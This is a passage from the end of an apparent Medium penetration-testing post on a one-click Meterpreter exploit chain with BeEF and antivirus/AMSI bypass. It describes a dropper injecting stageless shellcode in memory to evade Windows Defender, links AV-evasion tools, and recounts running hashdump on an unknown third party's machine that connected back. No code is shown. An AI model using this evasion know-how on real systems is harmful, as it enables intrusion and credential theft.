dropper (stage 2) and execute it. The latter will then inject full meterpreter shellcode inside memory (since it’s stageless), so we won’t be catched when trying to load meterpreter modules.<br/>All of this is of course hidden from the victim, and we get our meterpreter session a few seconds after click. Meterpreter is fully working and not catched by anti-virus solution (in this case, we tested with up-to-date Windows Defender).</p></div></div></section><div class="n p fb gv gw gx" role="separator"><span class="gy ff bk gz ha hb"></span><span class="gy ff bk gz ha hb"></span><span class="gy ff bk gz ha"></span></div><section class="cz ea eb cu ec"><div class="n p"><div class="ae af ag ah ai ed ak t"><h1 id="121a" class="hc hd ef ap he hf hg ga hh hi hj gd hk hl hm hn ho hp hq hr hs ht hu hv hw hx de">Conclusion</h1><p id="ee5a" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">The method showcased here is quite simple and does not take a lot of efforts, which meets penetration testing requirements where you usually do not have a lot of time to prepare things or build fancy tools. Note that the technique that has been shown here to bypass AV is just one of the many ways that could be used in order to do so. <br/>Actually, we could go even further (and we are planning to) by automating shellcode changes. Then, we would have full automated MSF payload modification. You could encounter other defenses such as AppLocker, which we do not talk about here, that will render that kind of approach useless since PowerShell will not be at our disposal anymore. This could become the subject of another post in the future, depending on the feedback we will get.</p><h2 id="088b" class="kq hd ef ap he kr ks kt hh ku kv kw hk kx ky kz ho la lb lc hs ld le lf hw lg de">Funny side note</h2><p id="7712" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp cz de">After uploading our payload to VirusTotal, we got a connection back to our meterpreter listener from a third-party IP address. Our assumption is that it was THOR APT Scanner, which creates Yara rules from almost everything uploaded to VirusTotal (including PowerShell scripts without shellcode) but do not fall in the OST debate :P.<br/>Below is a screenshot of hashdump command we managed to run:</p><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds lh"><div class="iw w ab ix"><div class="li iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*wvX3asWI8PL2ZRRnZpEbjA.png?q=20" width="660" height="58"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="660" height="58"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1320/1*wvX3asWI8PL2ZRRnZpEbjA.png" width="660" height="58" srcSet="https://miro.medium.com/max/552/1*wvX3asWI8PL2ZRRnZpEbjA.png 276w, https://miro.medium.com/max/1104/1*wvX3asWI8PL2ZRRnZpEbjA.png 552w, https://miro.medium.com/max/1280/1*wvX3asWI8PL2ZRRnZpEbjA.png 640w, https://miro.medium.com/max/1320/1*wvX3asWI8PL2ZRRnZpEbjA.png 660w" sizes="660px"/></noscript></div></div></div><figcaption class="jd je dt dr ds jf jg ap b aq ar bo">Requests going through our nginx</figcaption></figure><figure class="ij ik il im in io dr ds paragraph-image"><div class="dr ds jh"><div class="iw w ab ix"><div class="lj iz w"><div class="ip iq du ir dv is t it iu iv"><img alt="Image for post" class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*XxzJZmJH2SAB5FH5DraL3w.png?q=20" width="624" height="234"/></div><img alt="Image for post" class="ip iq du ir dv is t c" width="624" height="234"/><noscript><img alt="Image for post" class="du ir dv is t" src="https://miro.medium.com/max/1248/1*XxzJZmJH2SAB5FH5DraL3w.png" width="624" height="234" srcSet="https://miro.medium.com/max/552/1*XxzJZmJH2SAB5FH5DraL3w.png 276w, https://miro.medium.com/max/1104/1*XxzJZmJH2SAB5FH5DraL3w.png 552w, https://miro.medium.com/max/1248/1*XxzJZmJH2SAB5FH5DraL3w.png 624w" sizes="624px"/></noscript></div></div></div><figcaption class="jd je dt dr ds jf jg ap b aq ar bo">Hashdump on remote machine</figcaption></figure><h1 id="926c" class="hc hd ef ap he hf id ga hh hi ie gd hk hl if hn ho hp ig hr hs ht ih hv hw hx de">References</h1><ol class=""><li id="ac2a" class="fw fx ef fy b fz hy ga gb gc hz gd ge gf ia gg gh gi ib gj gk gl ic gm gn gp lk jq jr de">@kmkz_security @darksh3llRU @bluedenkare</li><li id="d682" class="fw fx ef fy b fz js ga gb gc jt gd ge gf ju gg gh gi jv gj gk gl jw gm gn gp lk jq jr de"><a href="https://raw.githubusercontent.com/darksh3llRU/tools/master/psh-net_shellcode_fastchange.sh" class="dh kd" rel="noopener nofollow">https://raw.githubusercontent.com/darksh3llRU/tools/master/psh-net_shellcode_fastchange.sh</a></li><li id="5995" class="fw fx ef fy b fz js ga gb gc jt gd ge gf ju gg gh gi jv gj gk gl jw gm gn gp lk jq jr de"><a href="https://github.com/kmkz/Pentesting/tree/master/AV_Evasion" class="dh kd" rel="noopener nofollow">https://github.com/kmkz/Pentesting/AV_Evasion</a></li></ol></div></div></section></div></article><div class="ip dz lm ll t lt lr lu" data-test-id="post-sidebar"><div class="n p"><div class="ae af ag ah ai aj ak t"><div class="lv n x"><div class="dz"><div><div class="lw u w"><p class="ap b lx ly lz bo ma">Written by</p><div class="mb mc w"><a class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" rel="noopener" href="/@bluedenkare?source=post_sidebar--------------------------post_sidebar-----------"><h2 class="ap he db ar cx de cz">ゆり</h2></a></div><div class="md w"><span><button class="ap b aq ar de me r au mf mg mh mi ba bb bc mj mk ml bg bh bi bj bk bl">Follow</button></span></div></div><div class="mm mn mo n"><div class="n o"><div class="w ab mp mq mr ms mt"><span><a href="https://medium.com/m/signin?actionUrl=%2F_%2Fvote%2Fp%2F96b0eb61f1b6&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40bluedenkare%2F1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6&amp;source=post_sidebar-----96b0eb61f1b6---------------------clap_sidebar-----------" class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" rel="noopener"><div class="bu mu mv mw mx my mz na r nb nc"><svg width="29" height="29" aria-label="clap"><g fill-rule="evenodd"><path d="M13.74 1l.76 2.97.76-2.97zM16.82 4.78l1.84-2.56-1.43-.47zM10.38 2.22l1.84 2.56-.41-3.03zM22.38 22.62a5.11 5.11 0 0 1-3.16 1.61l.49-.45c2.88-2.89 3.45-5.98 1.69-9.21l-1.1-1.94-.96-2.02c-.31-.67-.23-1.18.25-1.55a.84.84 0 0 1 .66-.16c.34.05.66.28.88.6l2.85 5.02c1.18 1.97 1.38 5.12-1.6 8.1M9.1 22.1l-5.02-5.02a1 1 0 0 1 .7-1.7 1 1 0 0 1 .72.3l2.6 2.6a.44.44 0 0 0 .63-.62L6.1 15.04l-1.75-1.75a1 1 0 1 1 1.41-1.41l4.15 4.15a.44.44 0 0 0 .63 0 .44.44 0 0 0 0-.62L6.4 11.26l-1.18-1.18a1 1 0 0 1 0-1.4 1.02 1.02 0 0 1 1.41 0l1.18 1.16L11.96 14a.44.44 0 0 0 .62 0 .44.44 0 0 0 0-.63L8.43 9.22a.99.99 0 0 1-.3-.7.99.99 0 0 1 .3-.7 1 1 0 0 1 1.41 0l7 6.98a.44.44 0 0 0 .7-.5l-1.35-2.85c-.31-.68-.23-1.19.25-1.56a.85.85 0 0 1 .66-.16c.34.06.66.28.88.6L20.63 15c1.57 2.88 1.07 5.54-1.55 8.16a5.62 5.62 0 0 1-5.06 1.65 9.35 9.35 0 0 1-4.93-2.72zM13 6.98l2.56 2.56c-.5.6-.56 1.41-.15 2.28l.26.56-4.25-4.25a.98.98 0 0 1-.12-.45 1 1 0 0 1 .29-.7 1.02 1.02 0 0 1 1.41 0zm8.89 2.06c-.38-.56-.9-.92-1.49-1.01a1.74 1.74 0 0 0-1.34.33c-.38.29-.61.65-.71 1.06a2.1 2.1 0 0 0-1.1-.56 1.78 1.78 0 0 0-.99.13l-2.64-2.64a1.88 1.88 0 0 0-2.65 0 1.86 1.86 0 0 0-.48.85 1.89 1.89 0 0 0-2.67-.01 1.87 1.87 0 0 0-.5.9c-.76-.75-2-.75-2.7-.04a1.88 1.88 0 0 0 0 2.66c-.3.12-.61.29-.87.55a1.88 1.88 0 0 0 0 2.66l.62.62a1.88 1.88 0 0 0-.9 3.16l5.01 5.02c1.6 1.6 3.52 2.64 5.4 2.96a7.16 7.16 0 0 0 1.18.1c1.03 0 2-.25 2.9-.7A5.9 5.9 0 0 0 23 23.24c3.34-3.34 3.08-6.93 1.74-9.17l-2.87-5.04z"></path></g></svg></div></a></span></div><div class="w nd ne nf ng nh ni nj"><div class="nk"><h4 class="ap b aq ar bo"><button class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm">73<!-- --> </button></h4></div></div></div></div><div class="mn w"><button class="mx mv bu"><div class="nn n o am"><svg width="25" height="25" class="r" aria-label="responses"><path d="M19.07 21.12a6.33 6.33 0 0 1-3.53-1.1 7.8 7.8 0 0 1-.7-.52c-.77.21-1.57.32-2.38.32-4.67 0-8.46-3.5-8.46-7.8C4 7.7 7.79 4.2 12.46 4.2c4.66 0 8.46 3.5 8.46 7.8 0 2.06-.85 3.99-2.4 5.45a6.28 6.28 0 0 0 1.14 2.59c.15.21.17.48.06.7a.69.69 0 0 1-.62.38h-.03zm0-1v.5l.03-.5h-.03zm-3.92-1.64l.21.2a6.09 6.09 0 0 0 3.24 1.54 7.14 7.14 0 0 1-.83-1.84 5.15 5.15 0 0 1-.16-.75 2.4 2.4 0 0 1-.02-.29v-.23l.18-.15a6.6 6.6 0 0 0 2.3-4.96c0-3.82-3.4-6.93-7.6-6.93-4.19 0-7.6 3.11-7.6 6.93 0 3.83 3.41 6.94 7.6 6.94.83 0 1.64-.12 2.41-.35l.28-.08z" fill-rule="evenodd"></path></svg><div class="w ab no np nq nr ns nt nu nv"></div></div></button></div><div class="fu"><span><a href="https://medium.com/m/signin?actionUrl=%2F_%2Fbookmark%2Fp%2F96b0eb61f1b6&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40bluedenkare%2F1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6&amp;source=post_sidebar-----96b0eb61f1b6---------------------bookmark_sidebar-----------" class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" rel="noopener"><svg width="25" height="25" viewBox="0 0 25 25"><path d="M19 6a2 2 0 0 0-2-2H8a2 2 0 0 0-2 2v14.66h.01c.01.1.05.2.12.28a.5.5 0 0 0 .7.03l5.67-4.12 5.66 4.13a.5.5 0 0 0 .71-.03.5.5 0 0 0 .12-.29H19V6zm-6.84 9.97L7 19.64V6a1 1 0 0 1 1-1h9a1 1 0 0 1 1 1v13.64l-5.16-3.67a.49.49 0 0 0-.68 0z" fill-rule="evenodd"></path></svg></a></span></div></div></div></div></div></div></div><div class="ip dz ll lm ln lo lp lq lr ls"></div><div><div class="ck io n x p"><div class="n p"><div class="ae af ag ah ai ed ak t"><div class="n cj"></div><div class="n o cj"></div><div class="nw nx w"><div class="nx n ca fr"><div class="n am"><div class="ny w"><span class="w nz oa ob e d"><div class="n o"><div class="w ab mp mq mr ms mt"><span><a href="https://medium.com/m/signin?actionUrl=%2F_%2Fvote%2Fp%2F96b0eb61f1b6&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40bluedenkare%2F1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6&amp;source=post_actions_footer-----96b0eb61f1b6---------------------clap_footer-----------" class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" rel="noopener"><div class="bu mu mv mw mx my mz na r nb nc"><svg width="25" height="25" viewBox="0 0 25 25" aria-label="clap"><g fill-rule="evenodd"><path d="M11.74 0l.76 2.97.76-2.97zM14.81 3.78l1.84-2.56-1.42-.47zM8.38 1.22l1.84 2.56L9.8.75zM20.38 21.62a5.11 5.11 0 0 1-3.16 1.61l.49-.45c2.88-2.89 3.45-5.98 1.69-9.21l-1.1-1.94-.96-2.02c-.31-.67-.23-1.18.25-1.55a.84.84 0 0 1 .66-.16c.34.05.66.28.88.6l2.85 5.02c1.18 1.97 1.38 5.12-1.6 8.1M7.1 21.1l-5.02-5.02a1 1 0 0 1 .7-1.7 1 1 0 0 1 .72.3l2.6 2.6a.44.44 0 0 0 .63-.62L4.1 14.04l-1.75-1.75a1 1 0 1 1 1.41-1.41l4.15 4.15a.44.44 0 0 0 .63 0 .44.44 0 0 0 0-.62L4.4 10.26 3.22 9.08a1 1 0 0 1 0-1.4 1.02 1.02 0 0 1 1.41 0l1.18 1.16L9.96 13a.44.44 0 0 0 .62 0 .44.44 0 0 0 0-.63L6.43 8.22a.99.99 0 0 1-.3-.7.99.99 0 0 1 .3-.7 1 1 0 0 1 1.41 0l7 6.98a.44.44 0 0 0 .7-.5l-1.35-2.85c-.31-.68-.23-1.19.25-1.56a.85.85 0 0 1 .66-.16c.34.06.66.28.88.6L18.63 14c1.57 2.88 1.07 5.54-1.55 8.16a5.62 5.62 0 0 1-5.06 1.65 9.35 9.35 0 0 1-4.93-2.72zM11 5.98l2.56 2.56c-.5.6-.56 1.41-.15 2.28l.26.56-4.25-4.25a.98.98 0 0 1-.12-.45 1 1 0 0 1 .29-.7 1.02 1.02 0 0 1 1.41 0zm8.89 2.06c-.38-.56-.9-.92-1.49-1.01a1.74 1.74 0 0 0-1.34.33c-.38.29-.61.65-.71 1.06a2.1 2.1 0 0 0-1.1-.56 1.78 1.78 0 0 0-.99.13l-2.64-2.64a1.88 1.88 0 0 0-2.65 0 1.86 1.86 0 0 0-.48.85 1.89 1.89 0 0 0-2.67-.01 1.87 1.87 0 0 0-.5.9c-.76-.75-2-.75-2.7-.04a1.88 1.88 0 0 0 0 2.66c-.3.12-.61.29-.87.55a1.88 1.88 0 0 0 0 2.66l.62.62a1.88 1.88 0 0 0-.9 3.16l5.01 5.02c1.6 1.6 3.52 2.64 5.4 2.96a7.16 7.16 0 0 0 1.18.1c1.03 0 2-.25 2.9-.7A5.9 5.9 0 0 0 21 22.24c3.34-3.34 3.08-6.93 1.74-9.17l-2.87-5.04z"></path></g></svg></div></a></span></div><div class="w nd ne nf ng nh ni nj"><div class="ab oc nk"><h4 class="ap b aq ar de"><button class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm">73<span class="w h g f od oe"> </span></button><span class="w h g f od oe"></span></h4></div></div></div></span><span class="w h g f od oe"><div class="n cf"><div class="w ab mp mq"><span><a href="https://medium.com/m/signin?actionUrl=%2F_%2Fvote%2Fp%2F96b0eb61f1b6&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40bluedenkare%2F1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6&amp;source=post_actions_footer-----96b0eb61f1b6---------------------clap_footer-----------" class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" rel="noopener"><div class="bu mu mv mw mx my mz na r nb nc"><svg width="33" height="33" viewBox="0 0 33 33" aria-label="clap"><path d="M28.86 17.34l-3.64-6.4c-.3-.43-.71-.73-1.16-.8a1.12 1.12 0 0 0-.9.21c-.62.5-.73 1.18-.32 2.06l1.22 2.6 1.4 2.45c2.23 4.09 1.51 8-2.15 11.66a9.6 9.6 0 0 1-.8.71 6.53 6.53 0 0 0 4.3-2.1c3.82-3.82 3.57-7.87 2.05-10.39zm-6.25 11.08c3.35-3.35 4-6.78 1.98-10.47L21.2 12c-.3-.43-.71-.72-1.16-.8a1.12 1.12 0 0 0-.9.22c-.62.49-.74 1.18-.32 2.06l1.72 3.63a.5.5 0 0 1-.81.57l-8.91-8.9a1.33 1.33 0 0 0-1.89 1.88l5.3 5.3a.5.5 0 0 1-.71.7l-5.3-5.3-1.49-1.49c-.5-.5-1.38-.5-1.88 0a1.34 1.34 0 0 0 0 1.89l1.49 1.5 5.3 5.28a.5.5 0 0 1-.36.86.5.5 0 0 1-.36-.15l-5.29-5.29a1.34 1.34 0 0 0-1.88 0 1.34 1.34 0 0 0 0 1.89l2.23 2.23L9.3 21.4a.5.5 0 0 1-.36.85.5.5 0 0 1-.35-.14l-3.32-3.33a1.33 1.33 0 0 0-1.89 0 1.32 1.32 0 0 0-.39.95c0 .35.14.69.4.94l6.39 6.4c3.53 3.53 8.86 5.3 12.82 1.35zM12.73 9.26l5.68 5.68-.49-1.04c-.52-1.1-.43-2.13.22-2.89l-3.3-3.3a1.34 1.34 0 0 0-1.88 0 1.33 1.33 0 0 0-.4.94c0 .22.07.42.17.61zm14.79 19.18a7.46 7.46 0 0 1-6.41 2.31 7.92 7.92 0 0 1-3.67.9c-3.05 0-6.12-1.63-8.36-3.88l-6.4-6.4A2.31 2.31 0 0 1 2 19.72a2.33 2.33 0 0 1 1.92-2.3l-.87-.87a2.34 2.34 0 0 1 0-3.3 2.33 2.33 0 0 1 1.24-.64l-.14-.14a2.34 2.34 0 0 1 0-3.3 2.39 2.39 0 0 1 3.3 0l.14.14a2.33 2.33 0 0 1 3.95-1.24l.09.09c.09-.42.29-.83.62-1.16a2.34 2.34 0 0 1 3.3 0l3.38 3.39a2.17 2.17 0 0 1 1.27-.17c.54.08 1.03.35 1.45.76.1-.55.41-1.03.9-1.42a2.12 2.12 0 0 1 1.67-.4 2.8 2.8 0 0 1 1.85 1.25l3.65 6.43c1.7 2.83 2.03 7.37-2.2 11.6zM13.22.48l-1.92.89 2.37 2.83-.45-3.72zm8.48.88L19.78.5l-.44 3.7 2.36-2.84zM16.5 3.3L15.48 0h2.04L16.5 3.3z" fill-rule="evenodd"></path></svg></div></a></span></div><div class="w nd ne nf ng of og oh oi oj ok"><div class="ab oc nk"><h4 class="ap b aq ar de"><button class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm">73<span class="w h g f od oe"> </span></button><span class="w h g f od oe"></span></h4></div></div></div></span></div><div class="w ol om on oo op"></div><button class="mx mv bu"><div class="nn n o am"><div><div class="bk" role="tooltip" aria-hidden="false"><span class="oq w h g f od oe"><svg width="33" height="33" viewBox="0 0 33 33" fill="none" class="r" aria-label="responses"><path clip-rule="evenodd" d="M24.28 25.5l.32-.29c2.11-1.94 3.4-4.61 3.4-7.56C28 11.83 22.92 7 16.5 7S5 11.83 5 17.65s5.08 10.66 11.5 10.66c1.22 0 2.4-.18 3.5-.5l.5-.15.41.33a8.86 8.86 0 0 0 4.68 2.1 7.34 7.34 0 0 1-1.3-4.15v-.43zm1 .45c0 1.5.46 2.62 1.69 4.44.22.32.01.75-.38.75a9.69 9.69 0 0 1-6.31-2.37c-1.2.35-2.46.54-3.78.54C9.6 29.3 4 24.09 4 17.65 4 11.22 9.6 6 16.5 6S29 11.22 29 17.65c0 3.25-1.42 6.18-3.72 8.3z"></path></svg></span><span class="or w nz oa ob e d"><svg width="25" height="25" class="r" aria-label="responses"><path d="M19.07 21.12a6.33 6.33 0 0 1-3.53-1.1 7.8 7.8 0 0 1-.7-.52c-.77.21-1.57.32-2.38.32-4.67 0-8.46-3.5-8.46-7.8C4 7.7 7.79 4.2 12.46 4.2c4.66 0 8.46 3.5 8.46 7.8 0 2.06-.85 3.99-2.4 5.45a6.28 6.28 0 0 0 1.14 2.59c.15.21.17.48.06.7a.69.69 0 0 1-.62.38h-.03zm0-1v.5l.03-.5h-.03zm-3.92-1.64l.21.2a6.09 6.09 0 0 0 3.24 1.54 7.14 7.14 0 0 1-.83-1.84 5.15 5.15 0 0 1-.16-.75 2.4 2.4 0 0 1-.02-.29v-.23l.18-.15a6.6 6.6 0 0 0 2.3-4.96c0-3.82-3.4-6.93-7.6-6.93-4.19 0-7.6 3.11-7.6 6.93 0 3.83 3.41 6.94 7.6 6.94.83 0 1.64-.12 2.41-.35l.28-.08z" fill-rule="evenodd"></path></svg></span></div></div><div class="w ab os np ot nr ou nt ov ow ox oy"></div></div></button></div><div class="n o"><div class="fs w"><div class="bk" aria-hidden="false"><button class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" aria-label="Share Post"><svg width="25" height="25" class="r"><g fill-rule="evenodd"><path d="M15.6 5a.42.42 0 0 0 .17-.3.42.42 0 0 0-.12-.33l-2.8-2.79a.5.5 0 0 0-.7 0l-2.8 2.8a.4.4 0 0 0-.1.32c0 .12.07.23.16.3h.02a.45.45 0 0 0 .57-.04l2-2V10c0 .28.23.5.5.5s.5-.22.5-.5V2.93l2.02 2.02c.08.07.18.12.3.13.11.01.21-.02.3-.08v.01"></path><path d="M18 7h-1.5a.5.5 0 0 0 0 1h1.6c.5 0 .9.4.9.9v10.2c0 .5-.4.9-.9.9H6.9a.9.9 0 0 1-.9-.9V8.9c0-.5.4-.9.9-.9h1.6a.5.5 0 0 0 .35-.15A.5.5 0 0 0 9 7.5a.5.5 0 0 0-.15-.35A.5.5 0 0 0 8.5 7H7a2 2 0 0 0-2 2v10c0 1.1.9 2 2 2h11a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2"></path></g></svg></button></div></div><div class="oz w dn"><div class="fu"><span><a href="https://medium.com/m/signin?actionUrl=%2F_%2Fbookmark%2Fp%2F96b0eb61f1b6&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40bluedenkare%2F1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6&amp;source=post_actions_footer--------------------------bookmark_footer-----------" class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" rel="noopener"><svg width="25" height="25" viewBox="0 0 25 25"><path d="M19 6a2 2 0 0 0-2-2H8a2 2 0 0 0-2 2v14.66h.01c.01.1.05.2.12.28a.5.5 0 0 0 .7.03l5.67-4.12 5.66 4.13a.5.5 0 0 0 .71-.03.5.5 0 0 0 .12-.29H19V6zm-6.84 9.97L7 19.64V6a1 1 0 0 1 1-1h9a1 1 0 0 1 1 1v13.64l-5.16-3.67a.49.49 0 0 0-.68 0z" fill-rule="evenodd"></path></svg></a></span></div></div></div></div></div><div class="pa w"></div></div></div><div><div class="n p"><div class="ae af ag ah ai ed ak t"><div class="w pb pc fr"></div></div></div><div class="w fr"><div class="pd pe w pf"><div class="n p"><div class="ae af ag ah ai ed ak t"><div class="n o ca"><h2 class="ap he pg ph pi hh pj pk pl hk pm pn po ho pp pq pr hs ps pt pu hw it pv pw px py pz de"><a class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm" rel="noopener" href="/@bluedenkare?source=follow_footer--------------------------follow_footer-----------">More from ゆり</a></h2><span><button class="ap b aq ar de me r au mf mg mh mi ba bb bc mj mk ml bg bh bi bj bk bl">Follow</button></span></div></div></div></div></div><div class="qa w pf fr"><div class="n p"><div class="qb qc qd qe qf qg ak t"></div></div></div><div class="w qh fr"><div class="n p"><div class="ae af ag ah ai aj ak t"><div class="qi go w"><div class="qj u qk go w ql qm"><h2 class="ap he kr kt hh ku kw hk kx kz ho la lc hs ld lf hw de">More From Medium</h2></div><div class="cf n am cj qn qo qp qq qr qs qt qu qv qw qx qy qz ra rb"><div class="rc rd re rf rg rh ri rj rk rl rm rn ro rp rq rr rs rt ru rv rw"><div class="rx ry w"><div class="t is"><div class="n ca"><div class="w rz sa sb sc"><div class="sd w"><h2 class="ap he pg ph hh pj pk hk se sf ho sg sh hs si sj hw de"><a rel="noopener" href="/agoric/preventing-reentrancy-attacks-in-smart-contracts-3899bf837f23?source=post_internal_links---------0----------------------------">Preventing Reentrancy Attacks in Smart Contracts</a></h2></div><div class="o n"><div></div><div class="t w"><div class="n"><div style="flex:1"><span class="ap b aq ar de"><div class="cg n o sk"><span class="ap b sl ar de"><a class="dh di bp bq br bs bt bu bv ba sm bw dl dm" rel="noopener" href="/@katesills?source=post_internal_links---------0----------------------------">Kate Sills</a><span> <!-- -->in<!-- --> <a href="/agoric?source=post_internal_links---------0----------------------------" class="dh di bp bq br bs bt bu bv ba sm bw dl dm" rel="noopener">Agoric</a></span></span></div></span></div></div></div></div></div><div class="df ft w sn so"><a class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm w" rel="noopener" href="/agoric/preventing-reentrancy-attacks-in-smart-contracts-3899bf837f23?source=post_internal_links---------0----------------------------"><div class="iw w ab ix"><div class="sp iz w"><div class="ip iq du ir dv is t it iu iv"><img class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/0*CLa90L4u5myp76-B?q=20" width="70" height="70" role="presentation"/></div><img class="ip iq sq sr ss st su sv sw sx sy sz c" width="70" height="70" role="presentation"/><noscript><img class="sq sr ss st su sv sw sx sy sz" src="https://miro.medium.com/fit/c/140/140/0*CLa90L4u5myp76-B" width="70" height="70" srcSet="https://miro.medium.com/fit/c/96/140/0*CLa90L4u5myp76-B 48w, https://miro.medium.com/fit/c/140/140/0*CLa90L4u5myp76-B 70w" sizes="70px" role="presentation"/></noscript></div></div></a></div></div></div></div></div><div class="rc rd re rf rg rh ri rj rk rl rm rn ro rp rq rr rs rt ru rv rw"><div class="rx ry w"><div class="t is"><div class="n ca"><div class="w rz sa sb sc"><div class="sd w"><h2 class="ap he pg ph hh pj pk hk se sf ho sg sh hs si sj hw de"><a rel="noopener" href="/enrique-dans/do-we-need-to-recognize-that-we-have-a-facial-recognition-problem-39e1ecd85d37?source=post_internal_links---------1----------------------------">Do we need to recognize that we have a facial recognition problem?</a></h2></div><div class="o n"><div></div><div class="t w"><div class="n"><div style="flex:1"><span class="ap b aq ar de"><div class="cg n o sk"><span class="ap b sl ar de"><a class="dh di bp bq br bs bt bu bv ba sm bw dl dm" rel="noopener" href="/@edans?source=post_internal_links---------1----------------------------">Enrique Dans</a><span> <!-- -->in<!-- --> <a href="/enrique-dans?source=post_internal_links---------1----------------------------" class="dh di bp bq br bs bt bu bv ba sm bw dl dm" rel="noopener">Enrique Dans</a></span></span></div></span></div></div></div></div></div><div class="df ft w sn so"><a class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm w" rel="noopener" href="/enrique-dans/do-we-need-to-recognize-that-we-have-a-facial-recognition-problem-39e1ecd85d37?source=post_internal_links---------1----------------------------"><div class="iw w ab ix"><div class="sp iz w"><div class="ip iq du ir dv is t it iu iv"><img class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*Jtp4mELJnNBYDMwGP90HSw.jpeg?q=20" width="70" height="70" role="presentation"/></div><img class="ip iq sq sr ss st su sv sw sx sy sz c" width="70" height="70" role="presentation"/><noscript><img class="sq sr ss st su sv sw sx sy sz" src="https://miro.medium.com/fit/c/140/140/1*Jtp4mELJnNBYDMwGP90HSw.jpeg" width="70" height="70" srcSet="https://miro.medium.com/fit/c/96/140/1*Jtp4mELJnNBYDMwGP90HSw.jpeg 48w, https://miro.medium.com/fit/c/140/140/1*Jtp4mELJnNBYDMwGP90HSw.jpeg 70w" sizes="70px" role="presentation"/></noscript></div></div></a></div></div></div></div></div><div class="rc rd re rf rg rh ri rj rk rl rm rn ro rp rq rr rs rt ru rv rw"><div class="rx ry w"><div class="t is"><div class="n ca"><div class="w rz sa sb sc"><div class="sd w"><h2 class="ap he pg ph hh pj pk hk se sf ho sg sh hs si sj hw de"><a rel="noopener" href="/bloomberg/hackers-have-infiltrated-many-of-washington-states-agencies-1d248414e041?source=post_internal_links---------2----------------------------">Hackers Have Infiltrated Many of Washington State’s Agencies</a></h2></div><div class="o n"><div></div><div class="t w"><div class="n"><div style="flex:1"><span class="ap b aq ar de"><div class="cg n o sk"><span class="ap b sl ar de"><a class="dh di bp bq br bs bt bu bv ba sm bw dl dm" rel="noopener" href="/@bloomberg?source=post_internal_links---------2----------------------------">Bloomberg</a><span> <!-- -->in<!-- --> <a href="/bloomberg?source=post_internal_links---------2----------------------------" class="dh di bp bq br bs bt bu bv ba sm bw dl dm" rel="noopener">Bloomberg</a></span></span></div></span></div></div></div></div></div><div class="df ft w sn so"><a class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm w" rel="noopener" href="/bloomberg/hackers-have-infiltrated-many-of-washington-states-agencies-1d248414e041?source=post_internal_links---------2----------------------------"><div class="iw w ab ix"><div class="sp iz w"><div class="ip iq du ir dv is t it iu iv"><img class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*vRWZl-y4N4bKgRG0NCsE-Q.jpeg?q=20" width="70" height="70" role="presentation"/></div><img class="ip iq sq sr ss st su sv sw sx sy sz c" width="70" height="70" role="presentation"/><noscript><img class="sq sr ss st su sv sw sx sy sz" src="https://miro.medium.com/fit/c/140/140/1*vRWZl-y4N4bKgRG0NCsE-Q.jpeg" width="70" height="70" srcSet="https://miro.medium.com/fit/c/96/140/1*vRWZl-y4N4bKgRG0NCsE-Q.jpeg 48w, https://miro.medium.com/fit/c/140/140/1*vRWZl-y4N4bKgRG0NCsE-Q.jpeg 70w" sizes="70px" role="presentation"/></noscript></div></div></a></div></div></div></div></div><div class="rc rd re rf rg rh ri rj rk rl rm rn ro rp rq rr rs rt ru rv rw"><div class="rx ry w"><div class="t is"><div class="n ca"><div class="w rz sa sb sc"><div class="sd w"><h2 class="ap he pg ph hh pj pk hk se sf ho sg sh hs si sj hw de"><a rel="noopener" href="/@billatnapier/for-the-love-of-ciphers-four-square-1eb053edd9c?source=post_internal_links---------3----------------------------">For The Love of Ciphers: Four-square</a></h2></div><div class="o n"><div></div><div class="t w"><div class="n"><div style="flex:1"><span class="ap b aq ar de"><div class="cg n o sk"><span class="ap b sl ar de"><a class="dh di bp bq br bs bt bu bv ba sm bw dl dm" rel="noopener" href="/@billatnapier?source=post_internal_links---------3----------------------------">Prof Bill Buchanan OBE</a></span></div></span></div></div></div></div></div><div class="df ft w sn so"><a class="dh di bp bq br bs bt bu bv ba dj dk bw dl dm w" rel="noopener" href="/@billatnapier/for-the-love-of-ciphers-four-square-1eb053edd9c?source=post_internal_links---------3----------------------------"><div class="iw w ab ix"><div class="sp iz w"><div class="ip iq du ir dv is t it iu iv"><img class="du ir dv is t ja jb jc" src="https://miro.medium.com/max/60/1*sZamlaesGrM5m4Arr7_FNw.jpeg?q=20" width="70" height="70" 